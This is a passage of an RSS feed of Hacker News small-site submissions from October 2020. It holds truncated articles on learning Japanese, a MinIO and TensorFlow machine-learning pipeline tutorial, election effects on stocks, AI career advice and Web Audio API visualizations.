                  Rather than relying on word sequence, Japanese relies on particles to partner with words in order to indicate the role of the word in the sentence.  Think of particles as dancing partners wearing brightly colored clothing who let you know the current occupation of their partner.  A subject dances with a pink-scarf wearing dancer.  A topic dances with a blue-scarf wearing dancer.  A destination of travel dances with a green-scarf wearing dancer.  When we look at the dancers, we can see clearly who they are dancing with, letting us know what the sentence means.  
              </p>
              <p>Particles are used to explain the <strong>who, what, when, where, and how</strong> of Japanese sentences and they are in <strong>post-fix position</strong>, meaning that they follow the words to which they snap.</p>
              <p>Mastery of particles is essential to having a native-level understanding of Japanese.  In fact, by exploring a frequency dictionary or the <a href="https://pj.ninjal.ac.jp/corpus_center/bccwj/en/">Balanced Corpus of Contemporary Written Japanese,</a> one will find that <em>of the 37 most frequent words, 17 of them are particles (45%).</em></p>
                <p>
                  In Japanese Complete we teach particles using a method devised specifically for Japanese Complete and not available elsewhere: <strong>the bunsetsu jar</strong>.  Every jar (which contains a person, place, or thing) needs a lid (which contains a grammatical particle).</p>
                  
            </div>
          </div>
        </div>
    </div></section> <!--end part3-->

      <section id="part4">
      <div>
        <div>
          <div>
            <div>
                <h2>Kanji: Meanings</h2>
                <p>
                  Japan imported symbolic glyphs from mainland Asia and they are referred to as 漢字（かんじ） kanji — letters of the Han Dynasty and there are <a href="https://learnjapanesebest.wordpress.com/2019/12/11/the-four-types-of-kanji/">four types of kanji</a> where only 4% are simple pictographs and over 90% are "meaning-and-sound borrowers."
              </p>
              <p>In acquiring Japanese, modern learners often rely on methods inspired by <a href="https://smile.amazon.com/Remembering-Kanji-Complete-Japanese-Characters/dp/0824835921?pldnSite=1">Heisig's Remembering the Kanji,</a> a book written by James Heisig after he had arrived in Japan too late to take the introductory course; upon asking his friends what the hardest part of the language was, he was quickly informed that the Kanji are a most formidable adversary.  He took the spare time before the next semester started to try his best to conquer this formidable opponent, and in the process discovered that he could break the kanji down section-by-section, part-by-part, and develop clever mnemonic devices and imaginary scenes to remember their <strong>general meanings</strong> for the long-term.
              </p>
                <p>
                  Heisig only provides clear and concise mnemonics for the first hundred-or-so kanji in his series, which is quite deflating to the beginner, leaving much of the creative and mental work to the learner when they could be absorbing, rather than generating, content.  This is the reason that we have taken it upon ourselves at Japanese Complete to provide detailed mnemonic lessons for the kanji we teach.  You can see the most frequent 777 kanji on our <a href="https://japanesecomplete.com/777">777 kanji list.</a></p>
                
            </div>
          </div>
          <p><img src="https://japanesecomplete.com/img/shrine-green.jpg" alt="Image">
          </p>
        </div>
    </div></section> <!--end part 4-->

  <section id="part5">
      <div>
        <div>
          <p><img src="https://japanesecomplete.com/img/himeji-sky.jpg" alt="Image">
          </p>
          <div>
            <div>
                <h2>Verbs: Meanings, Connotations</h2>
                <p>
                  Every Japanese sentence ends with a verb.  Our classification scheme in Japanese Complete comes from conversations with expert language teachers from University College London and Middlebury College, schools renowned for their East Asian studies and language departments.  While normal textbooks try to wedge Japanese grammar as a round peg into the square-hole shape of English, Japanese Complete strives to simplify the equation as much as possible while retaining all the fidelity and integrity of real Japanese.  Our <a href="https://japanesecomplete.com/reverse-engineer/">Reverse Engineering a Japanese Sentence</a> page details how our classification of verbs and nouns differs from common textbooks, and illustrates how they are more coherent with actual Japanese.
              </p>
              <p>In general, verbs are the missing piece of every Japanese sentence and we must wait until the end of the sentence or phrase to hear or read them.  This is what makes translation and interpretation notoriously difficult, for a translator needing a verb to connect two thoughts, nouns, or ideas, must allow the Japanese speaker to complete the phrase, adding a significant delay to the process, all-the-while needing to be able to perceive the beginning of the next phrase.  The latency effect in translating and interpreting Japanese makes this skill quite coveted in tourism, national and international diplomacy, and any role where interpretation in real-time is a must.
              </p>
                <p>
                By learning a large subset of verbs in their "plain-form" first, and then learning how to transform verbs into their variety of tenses and aspects, one builds a solid foundation for understanding written and oral Japanese.  <strong>It is wise to familiarize oneself with the great variety of tenses, active and passive constructions, and formality levels early on, so that they are not completely foreign when encountered later on in advanced studies.</strong>  In Japanese Complete, we teach politeness levels, active and passive tenses, and the variety of verbs early on so that learners have a solid foundation and are not surprised to find whole new constructions in years 3 or 4, but instead are immediately confronted with the variegated tones of the language and its inflexions.
                </p>
                
            </div>
          </div>
        </div>
    </div></section> <!--end part 5-->

      <section id="part6">
      <div>
        <div>
          <div>
            <div>
                <h2>Kanji: Masking</h2>
                <p>
                  Have you ever written a message using emoji only?  Did you know that emoji is a word imported from Japanese?  
              </p>
              <p>
                Just as there are ways to communicate entirely using emoji, Japanese adopted a way early on of using …</p></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://japanesecomplete.com/path/">https://japanesecomplete.com/path/</a></em></p>]]>
            </description>
            <link>https://japanesecomplete.com/path/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938456</guid>
            <pubDate>Fri, 30 Oct 2020 02:19:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating large scale machine learning pipelines with MinIO and TensorFlow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24938451">thread link</a>) | @jtsymonds
<br/>
October 29, 2020 | https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/ | <a href="https://web.archive.org/web/*/https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <div><p>We are living in a transformative era defined by information and AI. Massive amounts of data are generated and collected every day to feed these voracious, state-of-the-art, AI/ML algorithms. The more data, the better the outcomes. </p><p>One of the frameworks that has emerged as the lead industry standards is <a href="https://www.tensorflow.org/">Google's TensorFlow</a>. &nbsp;Highly versatile, one can get started quickly and write simple models with their <a href="https://www.tensorflow.org/guide/keras?hl=en">Keras</a> framework. If you seek a more advanced approach TensorFlow also allows you to construct your own machine learning models using low level APIs. No matter what strategy you choose, TensorFlow will make sure that your algorithm gets optimized for whatever infrastructure you select for your algorithms - whether it's <a href="https://en.wikipedia.org/wiki/Central_processing_unit">CPU's</a>, <a href="https://en.wikipedia.org/wiki/Graphics_processing_unit">GPU's</a> or <a href="https://en.wikipedia.org/wiki/Tensor_processing_unit">TPU's</a>.</p></div><p>As datasets become too large to fit into memory or local disk, AI/ML pipelines now have the requirement to load data from an external data source. Take for example the <a href="https://en.wikipedia.org/wiki/ImageNet">ImageNet</a> dataset with its <code>14 Million Images</code> with an estimated storage size of <code>1.31TB</code>. This dataset cannot be fit into memory nor on any machine local storage drive. These challenges are further complicated if your pipelines are running inside a stateless environment such a Kubernetes (which is increasingly the norm). </p><p>The emerging standard for this problem is to employ high performance object storage in the design of your AI/ML pipelines. MinIO is the leader in this space and has published a number of benchmarks that speak to its throughput capabilities. In this post, we will cover how to leverage MinIO for your TensorFlow projects. </p><p><strong>A Four Stage Hyper-Scale Data Pipeline</strong></p><p>To build a hyper-scale pipeline we will have each stage of the pipeline read from MinIO. In this example we are going to build four stages of a machine learning pipeline. This architecture will load the desired data on-demand from MinIO. </p><p>First, we are going to preprocess our dataset and encode it in a format that TensorFlow can quickly digest. This format is the <a href="https://www.tensorflow.org/tutorials/load_data/tfrecord">tf.TFRecord</a>, which is a type of binary encoding for our data. We are taking this step because we do not want to waste time processing the data during the training as we are planning on loading each batch of training directly from MinIO as it's needed. If the data is pre-processed before we feed it into the model training we save a significant amount of time. Ideally, we create pre-processed chunks of data that group a good chunk of records - at least <code>100-200MB</code> in size.</p><p>To speed up the data-loading and training stages we are going to leverage the excellent <a href="https://www.tensorflow.org/api_docs/python/tf/data">tf.data</a> api. This API is designed to efficiently load data during the training/validation of our model. It prepares the next batch of data as the current one is being processed by the model. The advantage of this approach is that it ensures efficient utilization of expensive GPUs or TPUs which cannot sit idle due to slow loading data. MinIO does not encounter this problem - <a href="https://min.io/resources/docs/MinIO-Throughput-Benchmarks-on-NVMe-SSD-32-Node.pdf">it can saturate 100Gbps network with a few NVMe drives</a> or also <a href="https://min.io/resources/docs/MinIO-Throughput-Benchmarks-on-HDD-24-Node.pdf">with Hard Disk Drives</a> ensuring the pipeline is crunching data as fast as the hardware allows.</p><p>During training we want to make sure we store the training checkpoints of our model as well as TensorBoard histograms. The checkpoints are useful in case the training gets interrupted and we want to resume the training or if we get more data and want to keep training our model with the new data and the TensorBoard histograms let us see how the training is going as it happens. TensorFlow supports writing both of these directly to MinIO.</p><p>A quick side note. When the model is complete we will save it to MinIO as well - allowing us to serve it using <a href="https://www.tensorflow.org/tfx/guide/serving">TensorFlow Serving</a> &nbsp;- but that's a post for some other time.</p><figure><img src="https://blog.min.io/content/images/2020/05/Screen-Shot-2020-05-11-at-5.36.46-PM.png"><figcaption>End-to-End Pipeline using MinIO</figcaption></figure><h2 id="building-the-pipeline">Building the Pipeline</h2><p>For our hyper-scale pipeline we are going to use a dataset that can easily fit into your local computer so you can follow along. The <a href="https://ai.stanford.edu/~amaas/data/sentiment/">Large Movie Review Dataset </a>from Stanford is great since it has a large number of samples (25,000 for training and 25,000 for testing) so we are going to build a <a href="https://en.wikipedia.org/wiki/Sentiment_analysis">sentiment analysis model</a> that will tell us whether a movie review is <code>positive</code> or <code>negative</code>. Keep in mind that each step can be applied to any larger dataset. The advantage of this dataset is that you can try on your own computer. Let's get started!</p><p>Download the dataset and upload it to MinIO using <a href="https://docs.min.io/docs/minio-client-quickstart-guide.html">MinIO Client</a></p><pre><code>curl -O http://ai.stanford.edu/~amaas/data/sentiment/aclImdb_v1.tar.gz
mc mb myminio/datasets
mc cp aclImdb_v1.tar.gz myminio/datasets/</code></pre><p>Let's start by declaring some configurations for our pipeline, &nbsp;such as <code>batch size</code>, location of our dataset and a fixed <code>random seed</code> so we can run this pipeline again and again and get the same results.</p><pre><code>random_seed = 44
batch_size = 128
datasets_bucket = 'datasets'
preprocessed_data_folder = 'preprocessed-data'
tf_record_file_size = 500
# Set the random seed
tf.random.set_seed(random_seed)

# How to access MinIO
minio_address = 'localhost:9000'
minio_access_key = 'minioadmin'
minio_secret_key = 'minioadmin'</code></pre><p>We are going to download our dataset from MinIO using <code><a href="https://github.com/minio/minio-py">minio-py</a></code></p><pre><code>minioClient = Minio(minio_address,
                  access_key=minio_access_key,
                  secret_key=minio_secret_key,
                  secure=False)
try:
       minioClient.fget_object(
           datasets_bucket,
           'aclImdb_v1.tar.gz',
           '/tmp/dataset.tar.gz')
except ResponseError as err:
       print(err)</code></pre><p>Now let's uncompress the dataset to a temporary folder (<code>/tmp/dataset</code>) to preprocess our data</p><pre><code>extract_folder = f'/tmp/{datasets_bucket}/'

with tarfile.open("/tmp/dataset.tar.gz", "r:gz") as tar:
    tar.extractall(path=extract_folder)</code></pre><h3 id="pre-processing">Pre-Processing</h3><p>Due to the structure of the dataset we are going to read from four folders, initially <code>test</code> and <code>train</code> which hold <code>25,000</code> examples each, then, in each of those folders we have <code>12,500</code> of each label <code>pos</code> for positive comments and <code>neg</code> for negative comments. From these four folders, we are going to store all samples into two variables, <code>train</code> and <code>test</code>. If we were preprocessing a dataset that couldn't fit in the local machine we could simply load segments of the object, one at a time and process them as well.</p><pre><code>train = []
test = []

dirs_to_read = [
    'aclImdb/train/pos',
    'aclImdb/train/neg',
    'aclImdb/test/pos',
    'aclImdb/test/neg',
]

for dir_name in dirs_to_read:
    parts = dir_name.split("/")
    dataset = parts[1]
    label = parts[2]
    for filename in os.listdir(os.path.join(extract_folder,dir_name)):
        with open(os.path.join(extract_folder,dir_name,filename),'r') as f:
            content = f.read()
            if dataset == "train":
                train.append({
                    "text":content,
                    "label":label
                })
            elif dataset == "test":
                test.append({
                    "text":content,
                    "label":label
                })</code></pre><p>We will then shuffle the dataset so we don't introduce bias into the training by providing 12,500 consecutive positive examples followed by 12,500 consecutive negative examples. Our model would have a hard time generalizing that. By shuffling the data the model will get to see and learn from both positive and negative examples at the same time.</p><pre><code>random.Random(random_seed).shuffle(train)
random.Random(random_seed).shuffle(test)</code></pre><p>Since we are dealing with text we need to turn the text to a vector representation that accurately depicts the meanings of the sentence. If we were dealing with images we would resize the images and turn them into vector representations having each pixel be a value of the resized image. </p><p>For text, however, we have a bigger challenge since a word doesn't really have a numerical representation. This is where <a href="https://en.wikipedia.org/wiki/Embedding">embeddings</a> are useful. An embedding is a vector representation of some text, in this case we are going to represent the whole review as a single vector of 512 dimensions. Instead of doing the pre-processing of text manually (tokenizing, building vocabulary and training an embeddings layer) we are going to leverage an existing model called <a href="https://arxiv.org/abs/1803.11175">USE (Universal Sentence Encoder)</a> to encode sentences into vectors so we can continue with our example. This is one of the wonders of deep learning, the ability to re-use different models alongside yours. Here we use TensorFlow Hub and we are going to load the latest <code>USE</code> model.</p><pre><code>import tensorflow_hub as hub
embed = hub.load("https://tfhub.dev/google/universal-sentence-encoder-large/5")</code></pre><p>Since it would be too much to create the embeddings of <code>25,000</code> sentences and keep that in memory, we are going to slice our datasets into chunks of <code>500</code>.</p><p>To store our data into a <code>TFRecord</code> we need to encode the features as <code>tf.train.Feature</code>. &nbsp;We are going to store the label of our data as list of <code>tf.int64</code> and our Movie Review as a list of floats since after we encode the sentence using <code>USE</code> we will end-up with a embedding of <code>512</code> dimensions</p><pre><code>def _embedded_sentence_feature(value):
    return tf.train.Feature(float_list=tf.train.FloatList(value=value))
def _label_feature(value):
    return tf.train.Feature(int64_list=tf.train.Int64List(value=value))
def encode_label(label):
    if label == "pos":
        return tf.constant([1,0])
    elif label == "neg":
        return tf.constant([0,1])

# This will take the label and the embedded sentence and encode it as a tf.TFRecord
def serialize_example(label, sentence_tensor):
    feature = {
      'sentence': _embedded_sentence_feature(sentence_tensor[0]),
      'label': _label_feature(label),
    }
    example_proto = tf.train.Example(features=tf.train.Features(feature=feature))
    return example_proto
    
def process_examples(records,prefix=""):
    starttime = timeit.default_timer()
    total_training = len(records)
    print(f"Total of {total_training} elements")
    total_batches = math.floor(total_training / tf_record_file_size)
    if total_training % tf_record_file_size != 0:
        total_batches += 1 
    print(f"Total of {total_batches} files of {tf_record_file_size} records")

    counter = 0
 …</code></pre></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/">https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/</a></em></p>]]>
            </description>
            <link>https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938451</guid>
            <pubDate>Fri, 30 Oct 2020 02:18:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Predicting the stock market impact of the Presidential election outcome]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938426">thread link</a>) | @greatwave1
<br/>
October 29, 2020 | https://www.quiverquant.com/blog/092420 | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/blog/092420">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="presentation" width="100%"><tbody><tr><td><div id="hs_cos_wrapper_module_16009687456759" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div id="hs_cos_wrapper_module_16009687456759_" data-hs-cos-general-type="widget" data-hs-cos-type="rich_text"><p>The effect of the election on health technology and health services stocks will likely depend not only on who wins the Presidency but also on whether or not Republicans maintain control of the Senate.</p>

<p>If Democrats win both the White House and the Senate (and maintain control of the House) you’ll see revived efforts to pick up the pieces of the Affordable Care Act and continue to transform the U.S. healthcare system. This transformation is likely to come at the expense of private healthcare companies' bottom lines.</p>

<p>On the other hand, Republicans maintaining control of the White House and/or Senate would likely result in a divided government, with no significant legislation on healthcare being passed.</p>

<p><span><strong>Cannabis</strong></span></p>
<p>Not surprisingly, most major cannabis stocks have a very low Trump Beta, meaning they are likely to perform well if Biden is elected.</p>

<p><a href="https://www.quiverquant.com/dashboard/cgc?utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz--aeAl_3OrGl0eIcgqVx9ZyT6fLkP5VebAkQXLL8vu_yMXHRAtBKo4rmmQtRkFWTuB6kHhk" rel="noopener" data-hs-link-id="0" target="_blank">Canopy Growth Corp ($CGC)</a> has a Trump Beta of -0.20, <a href="https://www.quiverquant.com/dashboard/gwph?utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz--aeAl_3OrGl0eIcgqVx9ZyT6fLkP5VebAkQXLL8vu_yMXHRAtBKo4rmmQtRkFWTuB6kHhk" rel="noopener" data-hs-link-id="0" target="_blank">GW Pharmaceuticals ($GWPH)</a> comes in at -0.29, and <a href="https://www.quiverquant.com/dashboard/cron?utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz--aeAl_3OrGl0eIcgqVx9ZyT6fLkP5VebAkQXLL8vu_yMXHRAtBKo4rmmQtRkFWTuB6kHhk" rel="noopener" data-hs-link-id="0" target="_blank">Cronos Group ($CRON)</a> has a Trump Beta of -0.31.</p>

<p>Though Biden took a tough stance on federally controlled substances back in the 1980s and 1990s, he has recently embraced a platform of decriminalizing marijuana. Additionally, running mate Kamala Harris is known as an advocate for legalization. As a junior senator in California, she sponsored the Marijuana Opportunity Reinvestment and Expungement (MORE) Act, which the Democrat-controlled House Judiciary Committee passed last November. The bill hasn’t gotten anywhere yet, but many suppose that a democratic sweep this November could lead to marijuana legalization.</p>

<p>On the other hand, cannabis legislation has not been a priority under Trump, and there is no reason right now to believe that this will change during a second term.</p>

<p><span><strong>Large-cap Tech Companies</strong></span></p>
<p>Companies in the technology services and electronic technology sectors have an average Trump Beta of 0.12 and 0.15, respectively. This is primarily driven by the large-cap tech companies that dominate their industries, with Microsoft, Google, Apple, and Adobe all showing strong positive correlations with a Trump re-election.</p></div></div></td></tr></tbody></div></div>]]>
            </description>
            <link>https://www.quiverquant.com/blog/092420</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938426</guid>
            <pubDate>Fri, 30 Oct 2020 02:14:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advice from AI Experts to Those Starting Out in the Field]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938401">thread link</a>) | @navanchauhan
<br/>
October 29, 2020 | https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/ | <a href="https://web.archive.org/web/*/https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.re-work.co/content/images/size/w300/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 300w,
                            https://blog.re-work.co/content/images/size/w600/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 600w,
                            https://blog.re-work.co/content/images/size/w1000/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 1000w,
                            https://blog.re-work.co/content/images/size/w2000/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://blog.re-work.co/content/images/size/w2000/2020/10/antenna-cw-cj_nFa14-unsplash.jpg" alt="20+ Pieces Of Advice From AI Experts To Those Starting Out In The Field">
</figure>
<section>
<div>
<p>Following on from our previous <a href="https://blog.re-work.co/tag/expert-blogs/">expert-led series</a>, we asked our community of AI experts what advice they would give to both those starting out their careers and those that have a desire to potentially join the field. </p><p>Below we have contributions from those working in both academia and industry settings, all at the forefront of AI development. What pieces of advice would you add?</p><p>TL;DR available in the footer. </p><h3 id="alexia-jolicoeur-martineau-phd-researcher-mila"><a href="https://www.linkedin.com/in/alexiajm/">Alexia Jolicoeur-Martineau</a>, PhD Researcher, MILA</h3><p>Here are some general advices, they are a bit more research oriented, but the perfectionism one applies even to applied positions..</p><ul><li>Don't over <strong>obsess on having everything 100% perfect</strong>. Develop a getting things done attitude. Academic perfectionism is the biggest plague in academia</li><li>Don't expect your research to speak for itself. Promotion (on social media) and dissemination (with blog posts) is important</li></ul><hr><h3 id="jane-wang-senior-research-scientist-deepmind"><a href="https://www.linkedin.com/in/jane-wang-63167017/">Jane Wang</a>, Senior Research Scientist, DeepMind</h3><p><strong>Don't chase after the hottest trends or the biggest splashes</strong>, as these areas will have the most competition and also will likely be superseded quickly anyway. Think about what kinds of problems you're most interested in solving, and what problems are likely to make the most impact if solved. The first involves being aware of what kinds of work you like doing (programming, theorizing, playing with real-world data, etc), and the second involves looking around and being informed about how the rest of the world lives. <strong>It's important we don't silo ourselves off in a bubble in this field</strong>, because this technology is making and will continue to make a huge impact on everyone in the world. Try to figure out what kind of role you want to have in that impact, and how to actively shape that impact to be beneficial for everyone.</p><hr><h3 id="abhishek-gupta-founder-montreal-ai-ethics-institute"><a href="https://www.linkedin.com/in/abhishekguptamcgill/">Abhishek Gupta</a>, Founder, Montreal AI Ethics Institute</h3><p>For those who are just getting started in an AI role, my primary advice would be to take a measured approach in believing AI to be a magic bullet that solves everything. As reality and business constraints emerge, an emerging practitioner will realize the role that simplicity plays in achieving real-world deployments and how taking an engineering and scientific approach to the deployment of the systems is more important than chasing every shiny new technique that they see on the internet. A deep understanding of the societal impacts of their work is also something that they should consider as a part of their work. And finally, thinking about the value of collaborating with domain experts should be something that is front and center for an emerging practitioner. <strong>I have seen far too many new practitioners apply AI skills to projects where there is no domain expertise involved and it inevitably leads to non-meaningful outcomes</strong> that diminish the value of the time and effort that goes into creating a project and can also result in harm for the people who are the subjects of that system.</p><hr><h3 id="andriy-burkov-director-of-data-science-gartner"><a href="https://www.linkedin.com/in/andriyburkov/">Andriy Burkov</a>, Director of Data Science, Gartner</h3><p>1. Learn the foundations. <strong>"Hands-on" alone, without an understanding of the underlying math, will not let you become the best in this profession</strong>. Today, and especially in the next 5-7 years, the tools will become so mature, that only your imagination will count. <strong>In AI, you cannot imagine anything meaningful if you don't know how the machine "thinks."</strong> Take a sculptor, an architect, or a painter. The best of them know everything about the tools and materials they work with. The same is true for AI.2.<strong> Go where the data is</strong>. AI is nothing without data, just as your talents.</p><hr><h3 id="alireza-fathi-senior-research-scientist-google"><a href="https://www.linkedin.com/in/alireza-fathi-04338411/">Alireza Fathi</a>, Senior Research Scientist, Google</h3><p>The two main pieces that I can think of that can result in a successful career in AI are the following: (a) <strong>strong math and coding fundamentals</strong> and (b) being on top of the most recently published papers in the field. I think a strong background in Algebra, probability and statistics, machine learning and at the same time powerful coding skills are critical to the success of an AI scientist in the long term. Sometimes (like now) the field becomes more practical and result oriented where coding is a very necessary skill to be able to implement ideas and run experiments quickly and efficiently.</p><p>But there will always be times when things become more theoretical and fundamental where having a strong math background can make a big difference. <strong>Being on top of AI literature is another very important skill. Unlike most other established fields where one can learn a lot from books, AI is a very new field that is evolving day to day</strong>. Methods that were achieving state of the art performance six months ago will be obsolete now. Thus, being able to quickly read papers, understand them and position them in the large body of previous work is a necessary skill for a successful AI scientist.</p><hr><h3 id="sarah-laszlo-phd-senior-neuroscientist-x-the-moonshot-factory"><a href="https://www.linkedin.com/in/sarah-laszlo-284886114/">Sarah Laszlo</a>, PhD, Senior Neuroscientist, X, The Moonshot Factory</h3><p>1) &nbsp;Don't judge yourself for not knowing something.</p><p><strong>One of my team's principles for working together is that we all agree that "Not knowing something only means not knowing something.</strong>" &nbsp;It doesn't have any other meaning: it doesn't mean you are stupid; it doesn't mean you are not trying hard enough; it doesn't mean you aren't good at your job. &nbsp;It only means that you don't know that particular thing. &nbsp;No one can know everything, and you shouldn't judge yourself because you don't.</p><p>Which brings us to #2:</p><p>2) Don't work with people who judge you for not knowing everything.</p><p>Don't work with people that make you feel like you don't belong, aren't smart enough, can't do this job. To the extent that you get to choose what teams you work on, gravitate to teams where not knowing something is seen as an opportunity to learn something new, rather than a strike against you.</p><p><strong>In my experience, a good sign of a good team is an environment where questions are not only welcome, but encouraged</strong>. When a complicated topic is raised, do people ask questions, or sit silently with a grim look of determined understanding on their face? Is the environment welcoming for questions and curiosity, or do team members seem embarrassed to ask questions? Do team members make an effort to explain complicated topics? &nbsp;Does the team value presentations that everyone in the audience understands? Wherever you can, you should require the teams that you work on to create an inclusive environment where everyone’s curiosity is respected and valued. It is possible to work in the AI field without constantly feeling impostor-syndrome dread; don't accept it as the norm.</p><hr><h3 id="frankie-cancino-senior-ai-scientist-target"><a href="https://www.linkedin.com/in/frankie-cancino/">Frankie Cancino</a>, Senior AI Scientist, Target </h3><p>Landing your first AI role is electrifying. A career in AI comes with many challenges, but it allows for innovation and exciting possibilities. My first piece of advice – <strong>don’t forget the basics and what got you there</strong>. It is easy to jump at the newest tech and methodologies. However, building a solid foundation with skills that can be applied across many domains will help with the additional building blocks. These skills will include writing code, statistics, probability theory, and linear algebra. Which leads into my second bit of advice – <strong>never stop learning</strong>. Continue to put yourself in situations that will require you to learn. </p><p>If you follow the first bit of advice, you will set yourself up for success and give yourself flexibility in implementing solutions. Keep in mind, the mathematical knowledge alone may not be enough. You will likely need to develop some domain expertise in the area you decide to pursue. Other skills such as writing (good) code, scalability, excellent user experience, and learning from past mistakes are important to develop. Since technology continuously evolves, you will have to continuously apply this learning mindset to keep up. Something extra I will leave with – remember your why. As with any job or career, it rarely goes as smooth as you would hope. Personally, I find work in AI fascinating, interesting, and fun. <strong>You may have a different reason for entering the field of AI. Whatever your reason may be, it’s good to remind yourself on occasion</strong>.</p><hr><h3 id="jeff-clune-research-team-leader-openai"><a href="https://www.linkedin.com/in/jeff-clune-56403a26/">Jeff Clune</a>, Research Team Leader, OpenAI</h3><p>When speaking to Jeff earlier this year, I asked him what advice he would give to someone starting a career in AI or Data Science. It was simple (mainly due to the quick-fire question format of our interview), but one that leaves you pondering. "To quote the words of Wayne Gretzky, the greatest of all time, <strong>skate to where the puck is going not where it is now.</strong>" &nbsp;</p><hr><h3 id="anirudh-koul-machine-learning-lead-nasa"><a href="https://www.linkedin.com/in/anirudhkoul/">Anirudh Koul</a>, Machine Learning Lead, NASA &nbsp;</h3><p><strong>Learn by building projects</strong>: Everybody learns differently, but you need excitement, you need the motivation to keep learning day after day - after the glamour of AI buzz words dies out. So what better way to learn than to take something relatable, build it in a few lines of code using high-level APIs. And as you start getting comfortable, then start to look at the inner theory and improve your breadth and depth in knowledge step by step.</p><p><strong>Training is just half the battle: </strong>Questions to ponder over when you build any project:</p><ul><li>What would your complete end to end pipeline look like?</li><li>How would you build a cloud API to serve the web frontend?</li><li>How do you scale from hundreds of images vs millions to billions?</li><li>What would be the cost involved in scaling this up?</li><li>How would you evaluate performance metrics, eg latency, and accuracy for model drift?</li><li>How would you process the new incoming data? When would you retrain the model?</li><li>While scaling up how do you make your network and pipeline efficient? How do you reduce the floating-point computations in your network? How would you reduce the size of the embeddings while still having the same representative power?</li><li>What could be potential sources of bias?</li></ul><p><strong>An experienced AI practitioner asks these questions from the get-go. So building experience in end to end projects teaches you industry-relevant skills early on.</strong></p><hr><h3 id="lofred-madzou-ai-project-lead-world-economic-forum"><a href="https://www.linkedin.com/in/lofred-madzou-5878a875/">Lofred Madzou</a>, AI Project Lead, World Economic Forum </h3><p>Over the past decade, artificial intelligence (AI) has emerged as the software engine that drives the Fourth Industrial Revolution, a …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/">https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/</a></em></p>]]>
            </description>
            <link>https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938401</guid>
            <pubDate>Fri, 30 Oct 2020 02:10:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complexity of Songs (1984) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938398">thread link</a>) | @vagab0nd
<br/>
October 29, 2020 | http://www.cs.bme.hu/~friedl/alg/knuth_song_complexity.pdf | <a href="https://web.archive.org/web/*/http://www.cs.bme.hu/~friedl/alg/knuth_song_complexity.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.cs.bme.hu/~friedl/alg/knuth_song_complexity.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938398</guid>
            <pubDate>Fri, 30 Oct 2020 02:09:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Audio Visualizations Working with Web Audio API]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24938292">thread link</a>) | @arcatech
<br/>
October 29, 2020 | https://dwayne.xyz/post/audio-visualizations-web-audio-api | <a href="https://web.archive.org/web/*/https://dwayne.xyz/post/audio-visualizations-web-audio-api">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h2>Web Audio API</h2>
<p>I’ve been working on getting WebRTC video chat working here on the website for a few weeks now. I finally got to the point where both text, video chat, and screen sharing all work really well, but somewhere in the back of my mind I kept thinking about complaints about “<a href="https://www.psychologytoday.com/us/blog/brain-waves/202007/why-zoom-fatigue-is-real-and-what-you-can-do-about-it">Zoom fatigue</a>” during the pandemic:</p>
<blockquote>
<p>Zoom fatigue, Hall argues now, is real. “Zoom is exhausting and lonely because you have to be so much more attentive and so much more aware of what’s going on than you do on phone calls.” If you haven’t turned off your own camera, you are also watching yourself speak, which can be arousing and disconcerting. The blips, delays and cut off sentences also create confusion. Much more exploration needs to be done, but he says, “maybe this isn’t the solution to our problems that we thought it might have been.” Phone calls, by comparison, are less demanding. “You can be in your own space. You can take a walk, make dinner,” Hall says.</p>
</blockquote>

<p>It’s kind of an interesting thing to have on your mind while spending weeks writing/debugging/testing video chat code.</p>
